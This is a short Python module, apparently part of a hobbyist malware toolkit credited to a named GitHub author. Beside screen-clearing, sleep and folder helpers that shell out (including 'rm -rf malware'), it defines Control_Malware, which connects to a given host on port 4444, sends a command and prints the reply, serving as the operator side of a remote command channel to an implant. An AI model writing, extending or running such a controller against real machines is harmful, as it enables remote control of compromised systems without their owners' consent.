import os
import socket


def Reboot():
    os.system('python3 app.py')

def Cls():
    os.system('clear')
    
def DirMalware():
    os.system('mkdir malware')
def time(n):
    os.system(f'sleep {n}')
def DelMalware():
    os.system('rm -rf malware')
    
    
def Creditos():
    name = 'Loock_Anderson'
    github = 'https://github.com/SenhorLoock'
    layot = f'''
\033[0;33m-------\033[0;32m
Github\033[0;m:\033[0;31m {github}  \033[0;32m       
\033[0;33m-------   --------------------\033[0;32m
Author\033[0;m: \033[0;31m{name} \033[0;33m        
-------\033[0;m
    '''
    print (layot)
    
def Control_Malware(command,h):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((h,4444))
    s.send(command.encode())
    response = s.recv(1024)
    print (response.decode())
        